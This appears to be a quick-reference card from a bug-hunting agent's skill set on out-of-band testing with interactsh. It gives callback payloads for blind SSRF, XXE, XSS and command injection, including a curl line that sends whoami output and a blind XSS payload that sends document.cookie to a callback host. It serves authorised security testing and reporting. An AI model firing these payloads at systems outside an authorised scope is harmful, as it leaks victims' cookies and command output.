# OOB Infrastructure Quick Reference

Quick-reference card for setting up and using out-of-band testing infrastructure during hunts.

## Quick Start: interactsh

```bash
# Install (one-time)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Generate a callback URL
interactsh-client -v 2>&1 | head -5
# Output: [INF] Listing 1 payload for OOB Testing
# Output: abc123def456.oast.fun

# Use in payloads
# SSRF: http://abc123def456.oast.fun
# XXE:  <!ENTITY xxe SYSTEM "http://abc123def456.oast.fun/xxe">
# CMD:  curl http://abc123def456.oast.fun/$(whoami)

# Poll for callbacks (runs in background)
interactsh-client -sf abc123def456.oast.fun -json -o /tmp/oob-callbacks.json &
```

## Callback URL Format per Vuln Type

| Vulnerability | URL Format | What to Look For |
|---------------|-----------|-----------------|
| Blind SSRF | `http://TOKEN.oast.fun/ssrf-PARAM_NAME` | HTTP request from target IP |
| Blind XXE | `http://TOKEN.oast.fun/xxe` (in DTD) | HTTP request with exfil data |
| Blind XSS | `http://TOKEN.oast.fun/xss?c=` + document.cookie | Cookie/DOM data in query |
| Blind CMDi | `http://TOKEN.oast.fun/cmd/$(id\|base64)` | Command output in URL path |
| DNS exfil | `$(whoami).TOKEN.oast.fun` | DNS query with data in subdomain |

## Polling and Parsing

```bash
# Watch callbacks in real-time
tail -f /tmp/oob-callbacks.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        cb = json.loads(line)
        print(f\"[{cb.get('protocol','?')}] {cb.get('remote-address','?')} -> {cb.get('raw-request','')[:100]}\")
    except: pass
"
```

## Alternatives When interactsh is Unavailable

1. **webhook.site** - Free HTTP callback viewer (not for sensitive data)
2. **requestbin.com** - Similar to webhook.site
3. **canarytokens.org** - Generate DNS/HTTP tokens with email alerts
4. **netcat listener** - `nc -lvp 8888` on VPS (see @vps skill)
5. **Python HTTP server** - `python3 -m http.server 8888` on VPS

## Evidence Capture for Reports

When an OOB callback arrives:
1. Screenshot the callback log showing the request from target IP
2. Note the timestamp and correlate with your test request
3. Include both the trigger request (your curl/browser action) AND the callback evidence
4. For DNS callbacks: show the DNS query log with the subdomain containing exfil data

## Integration with Hunt Workflow

- Step 0 checks interactsh availability automatically
- If available: blind hypothesis cards get full testing
- If not available: blind findings tagged [NEEDS-PROOF] and surfaced to user
- The @vps skill can deploy interactsh on a fresh Vultr instance if needed
- The @blind-injection skill has detailed methodology for each blind injection type
